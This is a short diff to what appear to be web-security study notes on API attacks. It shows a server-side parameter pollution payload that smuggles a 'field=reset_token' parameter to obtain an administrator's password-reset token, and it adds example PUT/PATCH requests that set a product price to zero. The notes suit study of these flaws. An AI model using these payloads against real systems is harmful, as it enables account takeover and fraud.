@@ -1,4 +1,4 @@
-# API
+[#](#) API
 
 ### Server-side parameter pullution
 
@@ -29,3 +29,11 @@ Parameter Swapping?
     username=administrator%26field=reset_token
     secret_token_:)
     /forgot-password?reset_token=secret_token:)
+    
+Change Method (RESTful)
+
+    GET /api/products/1/price
+    "price":"$0.00"
+    PUT /api/products/1/price
+    PATCH /api/products/1/price
+    {"price":"0"}
